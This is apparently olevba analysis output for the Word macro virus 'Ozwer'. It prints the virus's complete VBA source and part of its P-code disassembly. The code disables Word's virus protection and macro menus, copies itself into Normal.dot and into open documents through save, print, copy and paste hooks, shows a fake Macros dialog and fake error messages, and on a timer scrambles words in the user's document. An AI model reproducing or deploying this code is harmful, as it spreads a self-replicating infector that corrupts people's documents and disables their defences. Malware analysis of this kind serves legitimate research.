olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ozwer
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ozwer - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ozwer.bas 
in file: Virus.MSWord.Ozwer - OLE stream: 'Macros/VBA/ozwer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public Sub AutoExec()
On Error Resume Next
    With CommandBars("tools")
.Controls(13).Enabled = False 'macro
.Controls(14).Enabled = False 'plantillas y complementos....
.Controls(15).Enabled = False  'personalizar...
.Controls(16).Enabled = True  'opciones...
End With
CommandBars("view").Controls(6).Enabled = False 'barras de herramientas
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
End Sub
Sub AutoClose()
c
End Sub
Sub inf()
On Error Resume Next
Options.SaveNormalPrompt = False
    If Nch = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ozwer", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="oswf", Object:=wdOrganizerObjectProjectItems
        Application.Caption = "° Microsoft Word"
    End If
    If Dch = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ozwer", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="oswf", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Function Nch()
Dim i As Integer
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "ozwer" Then Nch = True
    Next
End Function
Function Dch()
Dim j As Integer
    For j = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(j).Name = "ozwer" Then Dch = True
    Next
End Function
Public Sub c()
Options.SaveNormalPrompt = False
inf
End Sub
Sub FormatFont()
inf
Dialogs(wdDialogFormatFont).Show
End Sub
Sub FilePrint()
inf
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileSaveas()
c
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
c
ActiveDocument.Save
End Sub
Sub FileClose()
c
ActiveDocument.Close
End Sub
Sub filenew()
Word.Documents.Add
inf
timer
End Sub
Sub EditCopy()
inf
 
 Selection.Copy
End Sub
Sub editpaste()
inf

Selection.Paste
End Sub
Sub ToolsMacro()
On Error Resume Next
oswf.Show
End Sub
Sub FileExit()
c
Application.Quit
MsgBox ("oK")
End Sub
Sub ViewVBCode()
On Error Resume Next
Dim letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
MsgBox "Error interno en Word Basic Err=1100e." + vbCr + "Imposible cargar bibliotecas dinámicas." + vbCr + vbCr + "Compruebe que todos los archivos estén" + vbCr + "en sus carpetas." + vbCr + vbCr + "Si el problema persiste, consulte la guia" + vbCr + "del usuario.", vbCritical
Case "&Options..."
MsgBox "Word Basic internal error Err=1100e." + vbCr + "Unable to load module 1x6004." + vbCr + vbCr + "Check that all files are in their folders" + vbCr + "and that they are not damaged." + vbCr + vbCr + "If the problem persists, consult user´s guide.", vbCritical
End Select
End Sub
Sub ToolsOptions()
Dim Y As Byte
Randomize
Y = Int((7 * Rnd) + 1)
Select Case Y
    Case 1
        Dialogs(wdDialogToolsOptionsTabView).Show
    Case 2
        Dialogs(wdDialogToolsOptionsSpellingAndGrammar).Show
    Case 3
        Dialogs(wdDialogToolsOptionsTabPrint).Show
    Case 4
        Dialogs(wdDialogToolsOptionsTabEdit).Show
    Case 6
         Dialogs(wdDialogToolsOptionsTabTrackChanges).Show
    Case 5
         Dialogs(wdDialogToolsOptionsTabUserInfo).Show
    Case 7
         Dialogs(wdDialogToolsOptionsCompatibility).Show
    End Select
End Sub
Sub osw2()Rem muy muy buena pero sin forma de desarmarlo !!!!!
Dim indi, nu, nu2, limite, x As Integer
x = Int((4 * Rnd) + 1)
On Error GoTo bye
limite = ActiveDocument.Words.Count
If limite = (limite > 350 And limite < 400) Or (limite > 700 And limite < 750) Or (limite > 900 And limite < 950) Or (limite > 1000 And limite < 1050) Or (limite > 1150 And limite < 1200) Or (limite > 1300 And limite < 1350) Or (limite > 1500 And limite < 1600) And x = 3 Then
    Selection.HomeKey Unit:=wdStory
    For indi = 1 To limite
        Randomize
        nu2 = Int((5 * Rnd) + 2)
        nu = Int((4 * Rnd) + 1)
        indi = indi + nu2
            ActiveDocument.Words(indi).Select
        WordBasic.MoveText
            If nu = 1 Then
                        Selection.MoveRight Unit:=wdWord, Count:=nu2
            Else
                        Selection.MoveLeft Unit:=wdWord, Count:=nu2
            End If
        WordBasic.OK
Next indi
End If
timer
bye:
End Sub
Sub timer()
Application.OnTime When:=Now + TimeValue("00:20:00"), Name:="osw2"
End Sub
-------------------------------------------------------------------------------
VBA MACRO oswf.frm 
in file: Virus.MSWord.Ozwer - OLE stream: 'Macros/VBA/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 













































































Option Explicit
Private Sub CommandButton1_Click()
Beep
Beep
End Sub
Private Sub CommandButton2_Click()
On Error Resume Next
oswf.Hide
End Sub
Private Sub CommandButton3_Click()
Beep
Beep
End Sub
Private Sub CommandButton4_Click()
Beep
Beep
End Sub
Private Sub CommandButton5_Click()
Beep
Beep
End Sub
Private Sub CommandButton6_Click()
Beep
Beep
End Sub
Private Sub CommandButton7_Click()
Beep
Beep
End Sub
Private Sub userform_initialize()
On Error Resume Next
Dim user, docn, PyD, Pg, Cw, Dc, Mc, Pr, letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
        PyD = "Todas las Plantillas y documentos activos"
        Pg = "Normal.dot (plantilla global)"
        Cw = "Comandos de Word"
        Dc = " (documento)"
        Mc = "Macros creadas el "
        Pr = " por "
        CommandButton1.Caption = "Ejecutar"
        CommandButton1.ControlTipText = "Ejecuta una macro seleccionada (no hay macros disponibles)"
        CommandButton2.Caption = "Cancelar"
        CommandButton2.ControlTipText = "Cancelar selección"
        CommandButton3.Caption = "Paso a paso"
        CommandButton3.ControlTipText = "Ejecuta macro instrucción por instrucción"
        CommandButton4.Caption = "Modificar"
        CommandButton4.ControlTipText = "Modificar macro seleccionada (no hay macros disponibles)"
        CommandButton5.Caption = "Crear"
        CommandButton5.ControlTipText = "Crear una macro nueva (no disponible)"
        CommandButton7.Caption = "Eliminar"
        CommandButton7.ControlTipText = "Eliminar macro seleccionada (no hay macros disponibles)"
        CommandButton6.Caption = "Organizador..."
        Label3.Caption = "Nombre de la macro:"
        Label1.Caption = "Macros en:"
        Label2.Caption = "Descripción:"
        
        
Case "&Options..."
        PyD = "All templates and active documents"
        Pg = "Normal.dot (global template)"
        Cw = "Word commands"
        Dc = " (document)"
        Mc = "Macros made on "
        Pr = " by "
        CommandButton1.Caption = "Run"
        CommandButton1.ControlTipText = "Run selected macro (no macros available)"
        CommandButton2.Caption = "Cancel"
        CommandButton2.ControlTipText = "Cancel selection"
        CommandButton3.Caption = "Step by step"
        CommandButton3.ControlTipText = "Run macro step by step"
        CommandButton4.Caption = "Modify"
        CommandButton4.ControlTipText = "Modify selected macro seleccionada (no macros available)"
        CommandButton5.Caption = "New"
        CommandButton5.ControlTipText = "Create a new macro (not available)"
        CommandButton7.Caption = "Delete"
        CommandButton7.ControlTipText = "Delete selected macro (no macro selected)"
        CommandButton6.Caption = "Organizer..."
        Label3.Caption = "Macro name:"
        Label1.Caption = "Macros in:"
        Label2.Caption = "Description:"
End Select
docn = ActiveDocument.Name
user = Application.UserName
ComboBox1.Text = PyD
ComboBox1.AddItem (PyD), 0
ComboBox1.AddItem (Pg), 1
ComboBox1.AddItem (Cw), 2
ComboBox1.AddItem (docn & Dc), 3
ComboBox1.AddItem (""), 4
ComboBox1.AddItem (""), 5
TextBox1.Text = Mc & Date & Pr & user

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ozwer
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/ozwer - 9238 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	FuncDefn (Public Sub AutoExec())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	StartWithExpr 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #4:
' 	LitVarSpecial (False)
' 	LitDI2 0x000D 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x0005 "macro"
' Line #5:
' 	LitVarSpecial (False)
' 	LitDI2 0x000E 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x001D "plantillas y complementos...."
' Line #6:
' 	LitVarSpecial (False)
' 	LitDI2 0x000F 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001F 0x000F "personalizar..."
' Line #7:
' 	LitVarSpecial (True)
' 	LitDI2 0x0010 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x000B "opciones..."
' Line #8:
' 	EndWith 
' Line #9:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x0030 0x0016 "barras de herramientas"
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Sub AutoClose())
' Line #15:
' 	ArgsCall c 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub inf())
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #20:
' 	Ld Nch 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "ozwer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "oswf"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #23:
' 	LitStr 0x0010 "° Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld Dch 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #26:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "ozwer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "oswf"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Function Nch())
' Line #31:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #33:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "ozwer"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Nch 
' 	EndIf 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	EndFunc 
' Line #36:
' 	FuncDefn (Function Dch())
' Line #37:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #38:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #39:
' 	Ld j 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "ozwer"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dch 
' 	EndIf 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	EndFunc 
' Line #42:
' 	FuncDefn (Public Sub c())
' Line #43:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #44:
' 	ArgsCall inf 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub FormatFont())
' Line #47:
' 	ArgsCall inf 0x0000 
' Line #48:
' 	Ld wdDialogFormatFont 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub FilePrint())
' Line #51:
' 	ArgsCall inf 0x0000 
' Line #52:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub FileSaveas())
' Line #55:
' 	ArgsCall c 0x0000 
' Line #56:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub FileSave())
' Line #59:
' 	ArgsCall c 0x0000 
' Line #60:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub FileClose())
' Line #63:
' 	ArgsCall c 0x0000 
' Line #64:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub filenew())
' Line #67:
' 	Ld Word 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' Line #68:
' 	ArgsCall inf 0x0000 
' Line #69:
' 	ArgsCall timer 0x0000 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub EditCopy())
' Line #72:
' 	ArgsCall inf 0x0000 
' Line #73:
' Line #74:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub editpaste())
' Line #77:
' 	ArgsCall inf 0x0000 
' Line #78:
' Line #79:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub ToolsMacro())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	Ld oswf 
' 	ArgsMemCall Show 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub FileExit())
' Line #86:
' 	ArgsCall c 0x0000 
' Line #87:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #88:
' 	LitStr 0x0002 "oK"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub ViewVBCode())
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	Dim 
' 	VarDefn letr (As String)
' Line #93:
' 	LitDI2 0x0010 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	St letr 
' Line #94:
' 	Ld letr 
' 	SelectCase 
' Line #95:
' 	LitStr 0x000C "Opcio&nes..."
' 	Case 
' 	CaseDone 
' Line #96:
' 	LitStr 0x0026 "Error interno en Word Basic Err=1100e."
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0027 "Imposible cargar bibliotecas dinámicas."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0026 "Compruebe que todos los archivos estén"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0010 "en sus carpetas."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Si el problema persiste, consulte la guia"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x000C "del usuario."
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #97:
' 	LitStr 0x000B "&Options..."
' 	Case 
' 	CaseDone 
' Line #98:
' 	LitStr 0x0024 "Word Basic internal error Err=1100e."
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x001D "Unable to load module 1x6004."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Check that all files are in their folders"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x001E "and that they are not damaged."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x002E "If the problem persists, consult user´s guide."
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #99:
' 	EndSelect 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub ToolsOptions())
' Line #102:
' 	Dim 
' 	VarDefn Y (As Byte)
' Line #103:
' 	ArgsCall Read 0x0000 
' Line #104:
' 	LitDI2 0x0007 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Y 
' Line #105:
' 	Ld Y 
' 	SelectCase 
' Line #106:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #107:
' 	Ld wdDialogToolsOptionsTabView 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #108:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #109:
' 	Ld wdDialogToolsOptionsSpellingAndGrammar 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #110:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #111:
' 	Ld wdDialogToolsOptionsTabPrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #112:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #113:
' 	Ld wdDialogToolsOptionsTabEdit 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #114:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #115:
' 	Ld wdDialogToolsOptionsTabTrackChanges 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #116:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #117:
' 	Ld wdDialogToolsOptionsTabUserInfo 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #118:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #119:
' 	Ld wdDialogToolsOptionsCompatibility 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #120:
' 	EndSelect 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub osw2())
' 	Rem 0x0031 " muy muy buena pero sin forma de desarmarlo !!!!!"
' Line #123:
' 	Dim 
' 	VarDefn indi
' 	VarDefn nu
' 	VarDefn nu2
' 	VarDefn limite
' 	VarDefn x (As Integer)
' Line #124:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St x 
' Line #125:
' 	OnError bye 
' Line #126:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St limite 
' Line #127:
' 	Ld limite 
' 	Ld limite 
' 	LitDI2 0x015E 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0190 
' 	Lt 
' 	And 
' 	Paren 
' 	Eq 
' 	Ld limite 
' 	LitDI2 0x02BC 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x02EE 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x0384 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x03B6 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x03E8 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x041A 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x047E 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x04B0 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x0514 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0546 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x05DC 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0640 
' 	Lt 
' 	And 
' 	Paren 
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' Line #128:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #129:
' 	StartForVariable 
' 	Ld indi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld limite 
' 	For 
' Line #130:
' 	ArgsCall Read 0x0000 
' Line #131:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	St nu2 
' Line #132:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St nu 
' Line #133:
' 	Ld indi 
' 	Ld nu2 
' 	Add 
' 	St indi 
' Line #134:
' 	Ld indi 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #135:
' 	Ld WordBasic 
' 	ArgsMemCall MoveText 0x0000 
' Line #136:
' 	Ld nu 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #137:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	Ld nu2 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #138:
' 	ElseBlock 
' Line #139:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	Ld nu2 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0002 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	Ld WordBasic 
' 	ArgsMemCall OK 0x0000 
' Line #142:
' 	StartForVariable 
' 	Ld indi 
' 	EndForVariable 
' 	NextVar 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	ArgsCall timer 0x0000 
' Line #145:
' 	Label bye 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub timer())
' Line #148:
' 	Ld Now 
' 	LitStr 0x0008 "00:20:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0004 "osw2"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #149:
' 	EndSub 
' Macros/VBA/oswf - 7231 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' 	Option  (Explicit)
' Line #78:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #79:
' 	ArgsCall Beep 0x0000 
' Line #80:
' 	ArgsCall Beep 0x0000 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	Ld oswf 
' 	ArgsMemCall Hide 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #87:
' 	ArgsCall Beep 0x0000 
' Line #88:
' 	ArgsCall Beep 0x0000 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #91:
' 	ArgsCall Beep 0x0000 
' Line #92:
' 	ArgsCall Beep 0x0000 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #95:
' 	ArgsCall Beep 0x0000 
' Line #96:
' 	ArgsCall Beep 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #99:
' 	ArgsCall Beep 0x0000 
' Line #100:
' 	ArgsCall Beep 0x0000 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Private Sub CommandButton7_Click())
' Line #103:
' 	ArgsCall Beep 0x0000 
' Line #104:
' 	ArgsCall Beep 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Private Sub userform_initialize())
' Line #107:
' 	OnError (Resume Next) 
' Line #108:
' 	Dim 
' 	VarDefn user
' 	VarDefn docn
' 	VarDefn PyD
' 	VarDefn Pg
' 	VarDefn Cw
' 	VarDefn Dc
' 	VarDefn Mc
' 	VarDefn Pr
' 	VarDefn letr (As String)
' Line #109:
' 	LitDI2 0x0010 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	St letr 
' Line #110:
' 	Ld letr 
' 	SelectCase 
' Line #111:
' 	LitStr 0x000C "Opcio&nes..."
' 	Case 
' 	CaseDone 
' Line #112:
' 	LitStr 0x0029 "Todas las Plantillas y documentos activos"
' 	St PyD 
' Line #113:
' 	LitStr 0x001D "Normal.dot (plantilla global)"
' 	St Pg 
' Line #114:
' 	LitStr 0x0010 "Comandos de Word"
' 	St Cw 
' Line #115:
' 	LitStr 0x000C " (documento)"
' 	St Dc 
' Line #116:
' 	LitStr 0x0012 "Macros creadas el "
' 	St Mc 
' Line #117:
' 	LitStr 0x0005 " por "
' 	St Pr 
' Line #118:
' 	LitStr 0x0008 "Ejecutar"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #119:
' 	LitStr 0x003A "Ejecuta una macro seleccionada (no hay macros disponibles)"
' 	Ld CommandButton1 
' 	MemSt ControlTipText 
' Line #120:
' 	LitStr 0x0008 "Cancelar"
' 	Ld CommandButton2 
' 	MemSt Caption 
' Line #121:
' 	LitStr 0x0012 "Cancelar selección"
' 	Ld CommandButton2 
' 	MemSt ControlTipText 
' Line #122:
' 	LitStr 0x000B "Paso a paso"
' 	Ld CommandButton3 
' 	MemSt Caption 
' Line #123:
' 	LitStr 0x0029 "Ejecuta macro instrucción por instrucción"
' 	Ld CommandButton3 
' 	MemSt ControlTipText 
' Line #124:
' 	LitStr 0x0009 "Modificar"
' 	Ld CommandButton4 
' 	MemSt Caption 
' Line #125:
' 	LitStr 0x0038 "Modificar macro seleccionada (no hay macros disponibles)"
' 	Ld CommandButton4 
' 	MemSt ControlTipText 
' Line #126:
' 	LitStr 0x0005 "Crear"
